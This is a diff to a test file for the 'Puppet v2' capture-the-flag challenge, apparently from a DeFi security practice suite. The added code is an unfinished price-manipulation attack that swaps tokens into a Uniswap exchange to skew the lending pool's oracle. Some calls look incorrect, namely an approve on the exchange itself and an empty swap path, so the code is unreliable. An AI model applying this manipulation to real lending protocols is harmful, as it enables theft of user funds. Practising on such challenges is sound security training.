@@ -82,7 +82,17 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR SOLUTION HERE **/
+        
+        //approve uniswap exchange to spend tokens
+        await uniswapExchange.connect(player).approve(uniswapExchange.address, 10000n * 10n ** 18n);
+
+        //Swap tokens for ETH
+        await uniswapExchange.connect(player).swapExactTokensForETH(10000n * 10n ** 18n, 1, [], player, (await ethers.provider.getBlock('latest')).timestamp + 42069);
+
+        //Deposit ETH into pool
+        console.log(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
+        
     });
 
     after(async function () {
